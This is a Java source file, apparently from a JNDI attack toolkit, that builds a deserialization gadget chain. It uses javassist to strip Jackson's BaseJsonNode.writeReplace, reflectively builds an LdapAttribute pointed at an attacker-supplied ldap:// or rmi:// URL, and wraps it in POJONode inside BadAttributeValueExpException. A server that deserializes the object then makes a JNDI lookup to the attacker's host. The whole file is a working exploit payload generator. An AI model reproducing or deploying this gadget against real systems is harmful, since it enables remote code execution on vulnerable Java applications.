package com.qi4l.jndi.gadgets;

import com.fasterxml.jackson.databind.node.POJONode;
import com.qi4l.jndi.enumtypes.PayloadType;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import javax.naming.CompositeName;
import javax.naming.directory.BasicAttribute;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;

public class JacksonLdapAttr implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        

        if (command.toLowerCase().startsWith("jndi:")) {
            command = command.substring(5);
        }

        if (!command.toLowerCase().startsWith("ldap://") && !command.toLowerCase().startsWith("rmi://")) {
            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
        }

        CtClass        ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        try {
            Class clazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
            Constructor clazz_cons = clazz.getDeclaredConstructor(new Class[]{String.class});
            clazz_cons.setAccessible(true);
            BasicAttribute la = (BasicAttribute)clazz_cons.newInstance(new Object[]{"exp"});
            Field bcu_fi = clazz.getDeclaredField("baseCtxURL");
            bcu_fi.setAccessible(true);
            bcu_fi.set(la, command);
            CompositeName cn = new CompositeName();
            cn.add("a");
            cn.add("b");
            Field rdn_fi = clazz.getDeclaredField("rdn");
            rdn_fi.setAccessible(true);
            rdn_fi.set(la, cn);
            POJONode node = new POJONode(la);
            BadAttributeValueExpException val = new BadAttributeValueExpException(null);
            Field valfield = val.getClass().getDeclaredField("val");
            valfield.setAccessible(true);
            valfield.set(val, node);
            return val;
        }catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
